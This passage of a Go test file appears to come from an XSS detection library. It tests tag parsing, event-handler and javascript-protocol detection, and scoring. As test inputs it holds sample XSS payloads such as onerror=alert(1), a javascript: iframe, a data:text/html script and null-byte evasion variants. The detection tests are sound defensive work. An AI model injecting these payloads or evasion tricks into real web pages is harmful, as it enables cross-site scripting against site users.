		t.Errorf("expected 'hello world', got %q", result)
	}
}

func TestHexVal_AllCases(t *testing.T) {
	// Digits
	for i := byte('0'); i <= '9'; i++ {
		v := hexVal(i)
		if v != int(i-'0') {
			t.Errorf("hexVal('%c') = %d, expected %d", i, v, i-'0')
		}
	}
	// Lowercase
	for i := byte('a'); i <= 'f'; i++ {
		v := hexVal(i)
		if v != int(i-'a')+10 {
			t.Errorf("hexVal('%c') = %d, expected %d", i, v, int(i-'a')+10)
		}
	}
	// Uppercase
	for i := byte('A'); i <= 'F'; i++ {
		v := hexVal(i)
		if v != int(i-'A')+10 {
			t.Errorf("hexVal('%c') = %d, expected %d", i, v, int(i-'A')+10)
		}
	}
	// Invalid
	if hexVal('g') != -1 {
		t.Error("expected -1 for 'g'")
	}
	if hexVal('G') != -1 {
		t.Error("expected -1 for 'G'")
	}
	if hexVal(' ') != -1 {
		t.Error("expected -1 for space")
	}
}

func TestContainsEventHandler_NoMatch(t *testing.T) {
	if containsEventHandler("no event handler here") {
		t.Error("expected false for text without event handler")
	}
}

func TestContainsEventHandler_OnlyPrefix(t *testing.T) {
	if containsEventHandler("on") {
		t.Error("expected false for just 'on'")
	}
}

func TestContainsEventHandler_ShortInput(t *testing.T) {
	if containsEventHandler("ab") {
		t.Error("expected false for short input")
	}
}

func TestHasJavaScriptProtocol_DataTextHTML(t *testing.T) {
	attrs := map[string]string{
		"src": "data:text/html,<script>alert(1)</script>",
	}
	name, protocol, ok := hasJavaScriptProtocol(attrs)
	if !ok {
		t.Fatal("expected data:text/html to be detected")
	}
	if name != "src" {
		t.Errorf("expected attr name 'src', got %q", name)
	}
	if protocol != "data:text/html" {
		t.Errorf("expected protocol 'data:text/html', got %q", protocol)
	}
}

func TestHasJavaScriptProtocol_NoMatch(t *testing.T) {
	attrs := map[string]string{
		"src": "https://example.com/image.png",
	}
	_, _, ok := hasJavaScriptProtocol(attrs)
	if ok {
		t.Error("expected no match for normal URL")
	}
}

func TestDetect_IframeWithJSProtocol(t *testing.T) {
	// iframe with javascript protocol should get high score
	findings := Detect(`<iframe src="javascript:alert(1)">`, "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 80 {
		t.Errorf("expected score >= 80, got %d\nfindings: %+v", totalScore, findings)
	}
}

// --- Coverage gap tests for scanTags (parser.go:17) ---

func TestScanTags_NullByteInAttribute(t *testing.T) {
	// Null byte within attribute name should be handled by the parser
	// (the parser skips null bytes while scanning attributes)
	tags := scanTags("<img\x00onerror=alert(1)>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag for input with null byte")
	}
	// After null byte handling, the tag should still be parsed
	// Check that the tag has some attributes parsed
	tag := tags[0]
	if tag.Name == "" {
		t.Error("expected non-empty tag name")
	}
}

func TestScanTags_UnclosedTagAtEnd(t *testing.T) {
	// Tag that never closes (no '>') -- parser should handle gracefully
	tags := scanTags("<img src=x")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag for unclosed tag")
	}
	if tags[0].Name != "img" {
		t.Errorf("expected tag name 'img', got %q", tags[0].Name)
	}
	if v, ok := tags[0].Attributes["src"]; !ok || v != "x" {
		t.Errorf("expected src=x attribute, got %v", tags[0].Attributes)
	}
}

func TestScanTags_WhitespaceAroundEquals(t *testing.T) {
	// Whitespace before and after the = sign in attribute
	tags := scanTags("<img onerror = alert(1)>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if _, ok := tags[0].Attributes["onerror"]; !ok {
		t.Error("expected 'onerror' attribute to be parsed despite whitespace around =")
	}
}

func TestScanTags_UnquotedAttributeValue(t *testing.T) {
	// Unquoted attribute value
	tags := scanTags("<img onerror=alert(1)>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if v, ok := tags[0].Attributes["onerror"]; !ok {
		t.Error("expected 'onerror' attribute")
	} else if v != "alert(1)" {
		t.Errorf("expected onerror=alert(1), got %q", v)
	}
}

func TestScanTags_NullByteAfterTagName(t *testing.T) {
	// Null byte right after tag name should stop name scanning, then be
	// skipped during attribute scanning
	tags := scanTags("<script\x00>alert(1)</script>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if tags[0].Name != "script" {
		t.Errorf("expected tag name 'script', got %q", tags[0].Name)
	}
}

func TestScanTags_TagEndImmediatelyAfterOpen(t *testing.T) {
	// '<>' should not produce a tag (no name)
	tags := scanTags("<>")
	if len(tags) != 0 {
		t.Errorf("expected 0 tags for '<>', got %d", len(tags))
	}
}

func TestScanTags_MultipleNullBytesBetweenAttrs(t *testing.T) {
	// Multiple null bytes in attribute area
	tags := scanTags("<div\x00\x00class\x00=\x00test>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if tags[0].Name != "div" {
		t.Errorf("expected tag name 'div', got %q", tags[0].Name)
	}
}

func TestDetect_NullByteInOnerror(t *testing.T) {
	// Full detection pipeline with null byte in event handler attribute name
	findings := Detect("<img\x00onerror=alert(1)>", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	// Should still detect as XSS (null bytes are stripped during detection)
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for null byte evasion, got %d", totalScore)
	}
}

func TestDetect_UnclosedTag(t *testing.T) {
	// Unclosed tag should still trigger detection for event handler
	findings := Detect("<img src=x onerror=alert(1)", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 70 {
		t.Errorf("expected score >= 70 for unclosed tag with event handler, got %d", totalScore)
	}
}

// Merged from xss_extra_test.go
func TestScanTags_EmptyAttributeName(t *testing.T) {
	tags := scanTags("<div =value>")
	if len(tags) == 0 {
		t.Fatal("expected at least one tag")
	}
	if tags[0].Name != "div" {
		t.Errorf("expected tag name 'div', got %q", tags[0].Name)
	}
}

// Merged from xss_gap_test.go
func TestCoverageGaps(t *testing.T) {
	if got := NewDetector(true, 1).Order(); got != 0 {
		t.Fatalf("Order() = %d, want 0", got)
	}
	for _, input := range []string{"1*2", "1 *2", "1* '2", `1* "2`} {
		if !hasTemplateArithmeticProbe(input) {
			t.Errorf("hasTemplateArithmeticProbe(%q) = false", input)
		}
	}
	if hasTemplateArithmeticProbe("x*2") {
		t.Fatal("non-numeric left operand must not match")
	}
	if hasTemplateArithmeticProbe("*1") {
		t.Fatal("missing left operand must not match")
	}
	if got := codePointRune(0); got != '\uFFFD' {
		t.Fatalf("codePointRune(0) = %U", got)
	}
	if !containsEventHandler("xx onclick=") {
		t.Fatal("expected handler after boundary")
	}
	if containsEventHandler("onclickX") {
		t.Fatal("onsomething without = must not match")
	}
}
